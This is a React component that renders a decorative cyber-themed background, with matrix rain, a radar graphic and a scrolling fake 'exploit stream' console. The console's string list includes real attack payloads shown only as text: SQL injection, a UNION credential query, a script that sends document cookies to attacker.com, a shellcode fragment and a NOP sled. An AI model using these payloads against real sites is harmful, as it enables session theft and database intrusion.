import { useState, useEffect, useRef } from 'react'
import { C, FONT, MATRIX_CHARS, HEX_CHARS, BINARY_CHARS } from '../constants'
import type { Screen } from '../types'

const EXPLOIT_PAYLOADS = [
  "SELECT * FROM users WHERE id='1' OR '1'='1'",
  "UNION SELECT null, username, password FROM admin--",
  "<script>document.location='http://attacker.com/cookie?='+document.cookie</script>",
  "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50",
  "GET /cgi-bin/test.cgi?%20HTTP/1.1\\r\\nHost: target",
  "WAF_BYPASS: X-Originating-IP: 127.0.0.1",
  "curl -d 'password=admin' -X POST http://localhost:8000/auth",
  "nmap -sV -p 80,443,8080,8443 -T4 target.domain",
  "PAYLOAD: <iframe src='javascript:alert(1)'></iframe>",
  "CRACKING HASH: $2a$12$R9h/cIPz0gi.UR3t3...",
  "STATUS: EXPLOIT COMPLETED [SESSION: 0x9F82]",
  "OVERFLOW SLED: \\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90",
  "INJECTING SHELLCODE... DONE",
  "RECON: CRAWLING INTERNAL ENDPOINTS...",
  "FOUND: /admin/config.php (403 Forbidden)",
  "BYPASSING AUTH WITH SQLi... SUCCESS",
  "EXTRACTING DATABASE TABLES... 14 TABLES FOUND",
  "CRITICAL: CVE-2024-XXXX EXPLOITED SUCCESSFULLY",
]

function ExploitConsole() {
  const doubleList = [...EXPLOIT_PAYLOADS, ...EXPLOIT_PAYLOADS, ...EXPLOIT_PAYLOADS]
  return (
    <div style={{
      width: '100%', height: '100%', overflow: 'hidden', position: 'relative',
      padding: '8px 12px',
    }}>
      <div style={{
        display: 'flex', flexDirection: 'column', gap: 12,
        animation: 'cyber-scroll-up 24s linear infinite',
      }}>
        {doubleList.map((payload, i) => (
          <div key={i} style={{
            fontFamily: FONT.mono, fontSize: 8,
            color: 'rgba(0, 255, 136, 0.75)',
            whiteSpace: 'pre-wrap',
            wordBreak: 'break-all',
            lineHeight: 1.3,
            textShadow: '0 0 2px rgba(0,255,136,0.3)',
          }}>
            <span style={{ color: C.green, marginRight: 4 }}>$</span>
            {payload}
          </div>
        ))}
      </div>
    </div>
  )
}

function MatrixRainCanvas() {
  const canvasRef = useRef<HTMLCanvasElement>(null)

  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return
    
    const resizeCanvas = () => {
      canvas.width = canvas.clientWidth
      canvas.height = canvas.clientHeight
    }
    resizeCanvas()

    const ctx = canvas.getContext('2d')
    if (!ctx) return

    const columns = Math.floor(canvas.width / 10)
    const yPositions = Array(columns).fill(0)

    let animationId: number
    const chars = '01010101010101HEX0XVERDICTSQLiXSS<>[]{}/\\'

    const draw = () => {
      ctx.fillStyle = 'rgba(5, 7, 10, 0.08)'
      ctx.fillRect(0, 0, canvas.width, canvas.height)

      ctx.fillStyle = '#00d4ff'
      ctx.font = '9px monospace'

      for (let i = 0; i < yPositions.length; i++) {
        const char = chars[Math.floor(Math.random() * chars.length)]
        const x = i * 10
        const y = yPositions[i]

        if (Math.random() > 0.98) {
          ctx.fillStyle = '#ffffff'
        } else {
          ctx.fillStyle = 'rgba(0, 212, 255, 0.8)'
        }

        ctx.fillText(char, x, y)

        if (y > canvas.height && Math.random() > 0.975) {
          yPositions[i] = 0
        } else {
          yPositions[i] += 10
        }
      }
      animationId = requestAnimationFrame(draw)
    }

    animationId = requestAnimationFrame(draw)
    
    window.addEventListener('resize', resizeCanvas)
    return () => {
      cancelAnimationFrame(animationId)
      window.removeEventListener('resize', resizeCanvas)
    }
  }, [])

  return <canvas ref={canvasRef} style={{ display: 'block', width: '100%', height: '100%' }} />
}

function CyberRadar({ isDashboard, reveal }: { isDashboard?: boolean; reveal?: number }) {
  const ro = reveal ?? 1
  return (
    <div style={{
      position: 'absolute', left: '50%', top: isDashboard ? '50%' : '45%',
      transform: `translate(-50%, -50%) scale(${0.3 + 0.7 * ro})`,
      width: isDashboard ? 700 : 500, height: isDashboard ? 700 : 500,
      pointerEvents: 'none', zIndex: 0,
      animation: 'cyber-pulse-radar 12s ease-in-out infinite',
      opacity: isDashboard ? 0.18 : 0.06 * ro,
      transition: 'opacity 700ms ease-out, transform 700ms ease-out',
    }}>
      <svg width="100%" height="100%" viewBox="0 0 200 200" style={{ position: 'absolute', inset: 0, animation: 'rotate-hex 45s linear infinite' }}>
        <circle cx="100" cy="100" r="95" stroke={C.green} strokeWidth="0.5" strokeDasharray="3 8" fill="none" />
        <circle cx="100" cy="100" r="85" stroke={C.green} strokeWidth="0.3" strokeDasharray="15 5" fill="none" />
      </svg>
      <svg width="100%" height="100%" viewBox="0 0 200 200" style={{ position: 'absolute', inset: 0, animation: 'rotate-hex 25s linear infinite reverse' }}>
        <circle cx="100" cy="100" r="75" stroke={C.cyan} strokeWidth="0.5" strokeDasharray="8 4 2 4" fill="none" />
        <path d="M 100 15 L 100 25 M 100 175 L 100 185 M 15 100 L 25 100 M 175 100 L 185 100" stroke={C.cyan} strokeWidth="0.8" fill="none" />
      </svg>
      <svg width="100%" height="100%" viewBox="0 0 200 200" style={{ position: 'absolute', inset: 0 }}>
        <circle cx="100" cy="100" r="45" stroke={C.green} strokeWidth="0.2" fill="none" />
        <circle cx="100" cy="100" r="2" fill={C.green} />
        <line x1="50" y1="100" x2="150" y2="100" stroke={C.green} strokeWidth="0.1" strokeDasharray="2 2" />
        <line x1="100" y1="50" x2="100" y2="150" stroke={C.green} strokeWidth="0.1" strokeDasharray="2 2" />
      </svg>
    </div>
  )
}

export default function Background({ isDashboard, screen }: { isDashboard: boolean; screen?: Screen }) {
  const [reveal, setReveal] = useState(screen !== 'landing' ? 1 : 0.0001)
  const rafRef = useRef(0)

  useEffect(() => {
    if (screen !== 'landing') {
      setReveal(1)
      return
    }
    const start = performance.now()
    const duration = 3000
    const animate = (now: number) => {
      const p = Math.min((now - start) / duration, 1)
      setReveal(p)
      if (p < 1) rafRef.current = requestAnimationFrame(animate)
    }
    rafRef.current = requestAnimationFrame(animate)
    return () => cancelAnimationFrame(rafRef.current)
  }, [screen])

  const [matrixCols] = useState(() =>
    Array.from({ length: 12 }, (_, i) => ({
      id: i,
      left: Math.random() * 100,
      delay: Math.random() * 8,
      duration: 6 + Math.random() * 8,
      chars: Array.from({ length: 8 + Math.floor(Math.random() * 12) }, () =>
        MATRIX_CHARS[Math.floor(Math.random() * MATRIX_CHARS.length)]
      ),
    }))
  )

  const [floating] = useState(() =>
    Array.from({ length: 6 }, (_, i) => ({
      id: i,
      left: 5 + Math.random() * 90,
      delay: Math.random() * 15,
      duration: 12 + Math.random() * 10,
      text: i % 2 === 0
        ? `${HEX_CHARS[Math.floor(Math.random()*16)]}${HEX_CHARS[Math.floor(Math.random()*16)]}${HEX_CHARS[Math.floor(Math.random()*16)]}`
        : BINARY_CHARS.slice(0, 4 + Math.floor(Math.random() * 4)),
      fontSize: 9 + Math.floor(Math.random() * 4),
    }))
  )

  const [hackerNodes] = useState(() =>
    Array.from({ length: 22 }, (_, i) => ({
      id: i,
      left: Math.random() * 100,
      size: 3 + Math.random() * 4,
      delay: Math.random() * 15,
      duration: 15 + Math.random() * 15,
    }))
  )

  const dotGridOpacity = isDashboard ? 0.38 : 0.42 * reveal

  return (
    <div style={{ position: 'fixed', inset: 0, zIndex: 0, pointerEvents: 'none' }}>
      <div style={{ position: 'absolute', inset: 0, background: C.bgPrimary }} />
      <div
        className={isDashboard ? "dot-grid-bg" : "dot-grid-bg-clean"}
        style={{
          position: 'absolute',
          top: -96, left: 0, right: 0, bottom: 0,
          height: 'calc(100% + 96px)',
          opacity: dotGridOpacity,
          transition: screen === 'landing' ? 'opacity 2000ms ease-out' : 'none',
        }}
      />

      {isDashboard ? (
        <>
          <div style={{ position: 'absolute', inset: 0, background: `radial-gradient(700px circle at top left, rgba(0,255,136,0.1), transparent)` }} />
          <div style={{ position: 'absolute', inset: 0, background: `radial-gradient(500px circle at top right, rgba(0,212,255,0.08), transparent)` }} />
          <div style={{ position: 'absolute', inset: 0, background: `radial-gradient(800px circle at bottom center, rgba(0,255,136,0.04), transparent)` }} />
        </>
      ) : (
        <>
          <div style={{ position: 'absolute', inset: 0, background: `radial-gradient(900px circle at 50% 40%, rgba(0,255,136,${0.09 * reveal}), transparent)`, transition: 'opacity 1500ms ease-out' }} />
          <div style={{ position: 'absolute', inset: 0, background: `radial-gradient(600px circle at 50% 50%, rgba(0,212,255,${0.07 * reveal}), transparent)`, transition: 'opacity 1500ms ease-out' }} />
        </>
      )}

      <CyberRadar isDashboard={isDashboard} reveal={reveal} />

      {hackerNodes.map(node => (
        <div
          key={node.id}
          style={{
            position: 'absolute',
            left: `${node.left}%`,
            width: node.size,
            height: node.size,
            borderRadius: '50%',
            background: node.id % 2 === 0 ? C.green : C.cyan,
            boxShadow: `0 0 10px ${node.id % 2 === 0 ? C.green : C.cyan}`,
            opacity: (isDashboard ? 0.32 : 0.2) * (0.2 + 0.8 * reveal),
            animation: `float-hex ${node.duration}s linear ${node.delay}s infinite`,
            pointerEvents: 'none',
            zIndex: 1,
            willChange: 'transform',
          }}
        />
      ))}



      <div style={{
        position: 'absolute', left: 0, top: 0, right: 0,
        background: isDashboard
          ? 'linear-gradient(180deg, transparent 0%, rgba(0,255,136,0.05) 50%, transparent 100%)'
          : 'linear-gradient(180deg, transparent 0%, rgba(0,255,136,0.03) 50%, transparent 100%)',
        height: 4,
        animation: 'scan-line 7s linear infinite',
        zIndex: 2,
        opacity: 0.3 + 0.7 * reveal,
        transition: 'opacity 1000ms ease-out',
      }} />

      <div style={{
        position: 'absolute', inset: 0,
        background: isDashboard
          ? 'repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.08) 2px, rgba(0,0,0,0.08) 4px)'
          : 'repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.04) 2px, rgba(0,0,0,0.04) 4px)',
        pointerEvents: 'none',
      }} />

      {matrixCols.map(col => (
        <div
          key={col.id}
          style={{
            position: 'absolute', left: `${col.left}%`, top: 0,
            animation: `matrix-fall ${col.duration}s linear ${col.delay}s infinite`,
            fontFamily: FONT.mono, fontSize: isDashboard ? 9 : 8, lineHeight: '14px',
            textAlign: 'center',
            writingMode: 'vertical-lr',
            color: isDashboard ? 'rgba(0,255,136,0.12)' : 'rgba(0,255,136,0.04)',
            opacity: 0.15 + 0.85 * reveal,
            textShadow: isDashboard ? '0 0 4px rgba(0,255,136,0.08)' : 'none',
            transition: 'opacity 1500ms ease-out',
            willChange: 'transform',
          }}
        >
          {col.chars.join('')}
        </div>
      ))}

      {floating.map(f => (
        <div
          key={f.id}
          style={{
            position: 'absolute', left: `${f.left}%`,
            animation: `float-hex ${f.duration}s linear ${f.delay}s infinite`,
            fontFamily: FONT.mono, fontSize: f.fontSize,
            color: isDashboard
              ? (f.id % 3 === 0 ? 'rgba(0,255,136,0.08)' : 'rgba(0,212,255,0.08)')
              : (f.id % 3 === 0 ? 'rgba(0,255,136,0.03)' : 'rgba(0,212,255,0.03)'),
            opacity: 0.1 + 0.9 * reveal,
            whiteSpace: 'nowrap',
            transition: 'opacity 1500ms ease-out',
            willChange: 'transform',
          }}
        >
          {f.text}
        </div>
      ))}

      {/* Left Hacker Console */}
      <div className="hud-left" style={{
        position: 'fixed', left: 32, top: 120, bottom: 120, width: 190,
        flexDirection: 'column',
        pointerEvents: 'none', zIndex: 1, opacity: 0.65 * reveal,
        transition: 'opacity 1000ms ease-out',
        background: 'rgba(5, 7, 10, 0.85)',
        border: `1px solid rgba(0, 255, 136, 0.25)`,
        borderRadius: 6,
        boxShadow: '0 0 15px rgba(0, 255, 136, 0.05), inset 0 0 10px rgba(0, 255, 136, 0.05)',
        overflow: 'hidden',
      }}>
        <div style={{
          height: 24, background: 'rgba(0, 255, 136, 0.1)',
          borderBottom: `1px solid rgba(0, 255, 136, 0.2)`,
          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
          padding: '0 10px',
        }}>
          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.green, fontWeight: 700, letterSpacing: '0.06em' }}>
            [EXPLOIT_STREAM]
          </span>
          <div style={{ display: 'flex', gap: 3 }}>
            <div style={{ width: 4, height: 4, borderRadius: '50%', background: C.green }} />
            <div style={{ width: 4, height: 4, borderRadius: '50%', background: C.green, opacity: 0.5 }} />
          </div>
        </div>
        <div style={{ flex: 1, position: 'relative', overflow: 'hidden' }}>
          <ExploitConsole />
          <div style={{
            position: 'absolute', left: 0, right: 0, height: 20, top: 0,
            background: 'linear-gradient(to bottom, transparent, rgba(0, 255, 136, 0.08) 50%, transparent)',
            animation: 'scan-line 4s linear infinite',
            pointerEvents: 'none',
          }} />
        </div>
      </div>

      {/* Right Hacker Console */}
      <div className="hud-right" style={{
        position: 'fixed', right: 32, top: 120, bottom: 120, width: 190,
        flexDirection: 'column',
        pointerEvents: 'none', zIndex: 1, opacity: 0.65 * reveal,
        transition: 'opacity 1000ms ease-out',
        background: 'rgba(5, 7, 10, 0.85)',
        border: `1px solid rgba(0, 212, 255, 0.25)`,
        borderRadius: 6,
        boxShadow: '0 0 15px rgba(0, 212, 255, 0.05), inset 0 0 10px rgba(0, 212, 255, 0.05)',
        overflow: 'hidden',
      }}>
        <div style={{
          height: 24, background: 'rgba(0, 212, 255, 0.1)',
          borderBottom: `1px solid rgba(0, 212, 255, 0.2)`,
          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
          padding: '0 10px',
        }}>
          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.cyan, fontWeight: 700, letterSpacing: '0.06em' }}>
            [MATRIX_RAIN]
          </span>
          <div style={{ display: 'flex', gap: 3 }}>
            <div style={{ width: 4, height: 4, borderRadius: '50%', background: C.cyan }} />
            <div style={{ width: 4, height: 4, borderRadius: '50%', background: C.cyan, opacity: 0.5 }} />
          </div>
        </div>
        <div style={{ flex: 1, position: 'relative', overflow: 'hidden', background: '#05070a' }}>
          <MatrixRainCanvas />
          <div style={{
            position: 'absolute', left: 0, right: 0, height: 20, top: 0,
            background: 'linear-gradient(to bottom, transparent, rgba(0, 212, 255, 0.08) 50%, transparent)',
            animation: 'scan-line 5s linear infinite',
            pointerEvents: 'none',
          }} />
        </div>
      </div>
    </div>
  )
}
